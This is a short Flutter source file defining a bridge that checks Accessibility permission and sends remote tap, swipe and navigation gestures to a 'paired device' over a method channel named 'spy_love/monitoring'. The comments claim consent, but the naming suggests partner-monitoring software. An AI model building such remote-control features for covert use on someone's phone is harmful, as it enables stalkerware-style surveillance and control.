import 'package:flutter/services.dart';

/// Native bridge for consented remote-screen gestures on the paired device.
///
/// Injection uses the Accessibility service (taps / swipes / Back-Home-Recents)
/// and never reads keystrokes, text, or clipboard contents.
class ScreenControlBridge {
  ScreenControlBridge._();

  static const _channel = MethodChannel('org.hmg.spy_love/monitoring');

  static Future<bool> isAvailable() async {
    try {
      return await _channel.invokeMethod<bool>('getSettingsPermissionState', {
            'page': 'accessibility',
          }) ??
          false;
    } on PlatformException {
      return false;
    } on MissingPluginException {
      return false;
    }
  }

  static Future<bool> inject(Map<String, dynamic> intent) async {
    try {
      return await _channel.invokeMethod<bool>('injectScreenControl', intent) ??
          false;
    } on PlatformException {
      return false;
    } on MissingPluginException {
      return false;
    }
  }
}
